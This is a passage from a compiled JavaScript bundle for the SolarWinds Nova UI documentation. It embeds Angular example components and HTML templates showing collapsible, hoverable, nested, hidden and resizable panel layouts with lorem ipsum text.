<code>&lt;nui-panel&gt;</code>, set the\n    <code>panelMode</code> input to \'collapsible\' and\n    <code>orientation</code> input to \'top\'. In this case expand/collapse button\n    will be always centered, but the position of other transcluded elements\n    remains flexible.\n</p>\n<nui-example-wrapper\n    filenamePrefix="panel-collapse-top-oriented"\n    exampleTitle="Collapsible Top Oriented Panel"\n>\n    <nui-panel-collapse-top-oriented-example></nui-panel-collapse-top-oriented-example>\n</nui-example-wrapper>\n\n<h2>External Collapse Toggle</h2>\n<p>\n    To change the collapsed state of the side pane manually, set the\n    <code>isCollapsed</code> boolean input. After the side pane has been\n    collapsed or expanded, a \'collapsed\' event is emitted with a boolean of true\n    if the side pane has been collapsed or false if the side pane has been\n    expanded.\n</p>\n<nui-example-wrapper\n    filenamePrefix="panel-collapse-outside-control"\n    exampleTitle="External Collapse Toggle"\n>\n    <nui-panel-collapse-outside-control-example></nui-panel-collapse-outside-control-example>\n</nui-example-wrapper>\n\n<h2>External Hide/Show Toggle</h2>\n<p>\n    To change the hidden state of the side pane manually, set the\n    <code>isHidden</code> boolean input. On hiding/showing of the side pane, a\n    \'hidden\' event is emitted with a boolean of true if the side pane has been\n    hidden or false if the side pane has been shown.\n</p>\n<nui-example-wrapper\n    filenamePrefix="panel-hide-outside-control"\n    exampleTitle="External Hide/Show Toggle"\n>\n    <nui-panel-hide-outside-control-example></nui-panel-hide-outside-control-example>\n</nui-example-wrapper>\n\n<h2>Nested</h2>\n<p>\n    Users can easily implement advanced layouts using nested panels. This\n    requires no additional features or knowledge.\n</p>\n<nui-example-wrapper filenamePrefix="panel-nested" exampleTitle="Nested Panels">\n    <nui-panel-nested-example></nui-panel-nested-example>\n</nui-example-wrapper>\n'},26891:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-panel-docs-example",\n    templateUrl: "./panel-docs.example.component.html",\n})\nexport class PanelDocsExampleComponent {}\n'},78621:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<button nui-button type="button" (click)="toggleFooter()" i18n>\n    Toggle Footer\n</button>\n<div>\n    <nui-panel id="nui-demo-embedded-content-panel" orientation="left">\n        <div class="d-flex mr-1" nuiPanelEmbeddedIcon>\n            <nui-icon [icon]="headerIcon" iconColor="gray"> </nui-icon>\n        </div>\n        <div nuiPanelEmbeddedHeading>\n            <span>\n                <h4 i18n class="my-0">TRANSCLUDED</h4>\n            </span>\n        </div>\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Integer quam nibh, tincidunt non massa quis, efficitur\n                    porttitor lacus. In quis tellus euismod, tincidunt libero\n                    quis, suscipit nunc. Nulla ac mattis tortor, quis iaculis\n                    sapien.\n                </p>\n            </div>\n        </div>\n        <div>\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n        <div\n            *ngIf="displayFooter"\n            nuiPanelEmbeddedFooter\n            class="d-flex justify-content-between"\n        >\n            <button nui-button type="button" (click)="onClickCancel()" i18n>\n                Cancel\n            </button>\n            <button\n                nui-button\n                type="button"\n                displayStyle="primary"\n                (click)="onClickConfirm()"\n                i18n\n            >\n                Confirm\n            </button>\n        </div>\n    </nui-panel>\n</div>\n'},2985:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-panel-embedded-content-example",\n    templateUrl: "./panel-embedded-content.example.component.html",\n})\nexport class PanelEmbeddedContentExampleComponent {\n    public isCollapsed = false;\n    public headerIcon = "filter";\n    public displayFooter = true;\n\n    constructor(@Inject(ToastService) private toastService: ToastService) {}\n\n    onClickCancel(): void {\n        this.toastService.info({\n            message: $localize`Cancel clicked!`,\n            title: $localize`Action`,\n        });\n    }\n\n    onClickConfirm(): void {\n        this.toastService.success({\n            message: $localize`Confirm clicked!`,\n            title: $localize`Action`,\n        });\n    }\n\n    public toggleFooter(): void {\n        this.displayFooter = !this.displayFooter;\n    }\n}\n'},37105:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-panel\n        panelMode="collapsible"\n        [displacePrimaryContent]="false"\n        id="nui-demo-floating-panel"\n    >\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Integer quam nibh, tincidunt non massa quis, efficitur\n                    porttitor lacus. In quis tellus euismod, tincidunt libero\n                    quis, suscipit nunc. Nulla ac mattis tortor, quis iaculis\n                    sapien.\n                </p>\n            </div>\n        </div>\n        <div>\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n    </nui-panel>\n</div>\n'},29021:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-panel-float-example",\n    templateUrl: "./panel-float.example.component.html",\n})\nexport class PanelFloatExampleComponent {}\n'},29829:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <button [disabled]="isHidden" type="button" nui-button (click)="hide()">\n        Hide\n    </button>\n    <button [disabled]="!isHidden" type="button" nui-button (click)="reveal()">\n        Reveal\n    </button>\n    <nui-panel\n        [isHidden]="isHidden"\n        (hidden)="getHideStateChanged($event)"\n        orientation="left"\n        panelMode="closable"\n        heading="Header"\n        i18n-heading\n        id="nui-demo-hidden-panel-external"\n    >\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Integer quam nibh, tincidunt non massa quis, efficitur\n                    porttitor lacus. In quis tellus euismod, tincidunt libero\n                    quis, suscipit nunc. Nulla ac mattis tortor, quis iaculis\n                    sapien.\n                </p>\n            </div>\n        </div>\n        <div>\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n    </nui-panel>\n</div>\n'},56609:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectorRef, Component, Inject } from "@angular/core";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-panel-hide-outside-control-example",\n    templateUrl: "./panel-hide-outside-control.example.component.html",\n})\nexport class PanelHideOutsideControlExampleComponent {\n    public isHidden = false;\n\n    public hide(): void {\n        this.isHidden = true;\n        this.changeDetectorRef.detectChanges();\n    }\n\n    public reveal(): void {\n        this.isHidden = false;\n        this.changeDetectorRef.detectChanges();\n    }\n\n    public getHideStateChanged($event: boolean): void {\n        this.isHidden = $event;\n        this.toastService.info({\n            message: this.isHidden ? $localize`Hidden` : $localize`Revealed`,\n            title: $localize`Panel State`,\n        });\n    }\n\n    constructor(\n        @Inject(ToastService) private toastService: ToastService,\n        private changeDetectorRef: ChangeDetectorRef\n    ) {}\n}\n'},85797:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-panel\n        orientation="left"\n        panelMode="closable"\n        heading="Header"\n        i18n-heading\n        id="nui-demo-hidden-panel"\n        [isResizable]="true"\n    >\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Integer quam nibh, tincidunt non massa quis, efficitur\n                    porttitor lacus. In quis tellus euismod, tincidunt libero\n                    quis, suscipit nunc. Nulla ac mattis tortor, quis iaculis\n                    sapien.\n                </p>\n            </div>\n        </div>\n        <div>\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n        <div nuiPanelEmbeddedFooter class="font-weight-bold">\n            EMBEDDED FOOTER\n        </div>\n    </nui-panel>\n</div>\n'},84769:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-panel-hide-example",\n    templateUrl: "./panel-hide.example.component.html",\n})\nexport class PanelHideExampleComponent {\n    public isHidden = false;\n}\n'},30713:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-panel\n        panelMode="hoverable"\n        orientation="left"\n        [displacePrimaryContent]="false"\n        id="nui-demo-hoverable-panel"\n    >\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Integer quam nibh, tincidunt non massa quis, efficitur\n                    porttitor lacus. In quis tellus euismod, tincidunt libero\n                    quis, suscipit nunc. Nulla ac mattis tortor, quis iaculis\n                    sapien.\n                </p>\n            </div>\n        </div>\n        <div>\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n    </nui-panel>\n</div>\n'},11701:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-panel-hoverable-example",\n    templateUrl: "./panel-hoverable.example.component.html",\n})\nexport class PanelHoverableExampleComponent {}\n'},37491:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-panel\n        panelMode="collapsible"\n        orientation="left"\n        [isCollapsed]="false"\n        (collapsed)="onCollapseChange($event)"\n    >\n        <div nuiPanelEmbeddedHeading class="flex flex-row align-items-center">\n            <span>\n                <h4 i18n class="my-0">Outer Panel</h4>\n            </span>\n        </div>\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Integer quam nibh, tincidunt non massa quis, efficitur\n                    porttitor lacus. In quis tellus euismod, tincidunt libero\n                    quis, suscipit nunc. Nulla ac mattis tortor, quis iaculis\n                    sapien.\n                </p>\n            </div>\n        </div>\n        <div>\n            <nui-panel\n                class="w-100"\n                panelMode="collapsible"\n                orientation="left"\n                [isCollapsed]="false"\n            >\n                <div\n                    nuiPanelEmbeddedHeading\n                    class="flex flex-row align-items-center"\n                >\n                    <span>\n                        <h4 i18n class="my-0">Inner Panel</h4>\n                    </span>\n                </div>\n                <div nuiPanelEmbeddedBody>\n                    <div>\n                        <p i18n>\n                            Lorem ipsum dolor sit amet, consectetur adipiscing\n                            elit. Integer quam nibh, tincidunt non massa quis,\n                            efficitur porttitor lacus. In quis tellus euismod,\n                            tincidunt libero quis, suscipit nunc. Nulla ac\n                            mattis tortor, quis iaculis sapien.\n                        </p>\n                    </div>\n                </div>\n                <div>\n                    <p i18n>\n                        Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                        Donec efficitur rutrum lacus id vulputate. Integer eu ex\n                        eu augue efficitur luctus quis ac elit. Nam odio est,\n                        iaculis nec varius id, congue erat. Nullam mi lectus,\n                        gravida quis pretium sit amet, accumsan non elit. In\n                        tempus commodo sem ac vulputate. Sed vel sagittis purus.\n                        Integer non ornare felis. Sed aliquam, purus et euismod\n                        tincidunt, felis ligula fermentum mi, eget commodo nisl\n                        orci efficitur dui. Etiam interdum justo magna\n                        consequat, vitae hendrerit mi aliquam. Sed non ex eu\n                        purus ornare lobortis tempus id est. Aenean dictum at\n                        dui sit amet mollis. Phasellus mauris arcu, blandit id\n                        congue vitae, elementum amet enim. Pellentesque et\n                        facilisis leo, sit amet rhoncus magna. Integer commodo\n                        lobortis arcu et bibendum. Pellentesque sagittis magna\n                        sed tellus volutpat, sed eleifend justo ornare. Fusce\n                        porttitor laoreet dui a mollis.\n                    </p>\n                </div>\n            </nui-panel>\n        </div>\n    </nui-panel>\n</div>\n'},29963:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-panel-nested-example",\n    templateUrl: "./panel-nested.example.component.html",\n})\nexport class PanelNestedExampleComponent {\n    public isCollapsible = true;\n    public isCollapsed = false;\n    public isInnerCollapsed = true;\n    public outerRepeat = [\n        {\n            name: "AvantiA",\n            type: "V12",\n            disabled: true,\n        },\n        {\n            name: "AvantiA",\n            type: "V12",\n            disabled: true,\n        },\n        {\n            name: "AvantiA",\n            type: "V12",\n            disabled: true,\n        },\n        {\n            name: "AvantiA",\n            type: "V12",\n            disabled: true,\n        },\n    ];\n    public innerRepeat = [\n        {\n            name: `AvantiA Item-${Math.round(Math.random() * 100)}`,\n            type: "V12",\n            disabled: true,\n        },\n        {\n            name: `AvantiA Item-${Math.round(Math.random() * 100)}`,\n            type: "V12",\n            disabled: true,\n        },\n        {\n            name: `AvantiA Item-${Math.round(Math.random() * 100)}`,\n            type: "V12",\n            disabled: true,\n        },\n        {\n            name: `AvantiA Item-${Math.round(Math.random() * 100)}`,\n            type: "V12",\n            disabled: true,\n        },\n    ];\n    public headerIcon = "filter";\n    public headerIconCounter = 4;\n\n    public onCollapseChange($event: boolean): void {\n        this.isCollapsed = $event;\n    }\n}\n'},65747:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-panel orientation="top">\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Integer eu ex eu augue efficitur luctus quis ac elit. Nam\n                    odio est, iaculis nec varius id, congueerat. Nullam mi\n                    lectus, gravida quis pretium sit amet, accumsan non elit. In\n                    tempus commodo sem ac vulputate. Sed vel sagittis purus.\n                    Integer non ornare felis. Sed aliquam, purus et\n                    euismodtincidunt, felis ligula fermentum mi, eget commodo\n                    nisl orci efficitur dui. Etiam interdum justo magna\n                    consequat, vitae hendrerit mi aliquam. Sed non ex eu purus\n                    ornare lobortis tempus id est. Aenean dictum at dui sit amet\n                    mollis. Phasellus mauris arcu, blandit id congue vitae,\n                    elementum amet enim.\n                </p>\n            </div>\n        </div>\n        <div>\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue vitae, elementum amet enim.\n                Pellentesque et facilisis leo, sit amet rhoncus magna. Integer\n                commodo lobortis arcu et bibendum. Pellentesque sagittis magna\n                sed tellus volutpat, sed eleifend justo ornare. Fusce porttitor\n                laoreet dui a mollis.\n            </p>\n        </div>\n    </nui-panel>\n</div>\n'},78699:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-panel-position-example",\n    templateUrl: "./panel-position.example.component.html",\n})\nexport class PanelPositionExampleComponent {}\n'},9689:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div style="height: 300px">\n    <nui-panel\n        id="nui-demo-resizable-panel"\n        panelMode="collapsible"\n        isResizable="true"\n        heading="Header"\n        i18n-heading\n        paneSize="20%"\n    >\n        <div nuiPanelEmbeddedBody>\n            <div>\n                <p i18n>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Integer quam nibh, tincidunt non massa quis, efficitur\n                    porttitor lacus. In quis tellus euismod, tincidunt libero\n                    quis, suscipit nunc. Nulla ac mattis tortor, quis iaculis\n                    sapien.\n                </p>\n            </div>\n        </div>\n        <div>\n            <p i18n>\n                Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec\n                efficitur rutrum lacus id vulputate. Integer eu ex eu augue\n                efficitur luctus quis ac elit. Nam odio est, iaculis nec varius\n                id, congue erat. Nullam mi lectus, gravida quis pretium sit\n                amet, accumsan non elit. In tempus commodo sem ac vulputate. Sed\n                vel sagittis purus. Integer non ornare felis. Sed aliquam, purus\n                et euismod tincidunt, felis ligula fermentum mi, eget commodo\n                nisl orci efficitur dui. Etiam interdum justo magna consequat,\n                vitae hendrerit mi aliquam. Sed non ex eu purus ornare lobortis\n                tempus id est. Aenean dictum at dui sit amet mollis. Phasellus\n                mauris arcu, blandit id congue 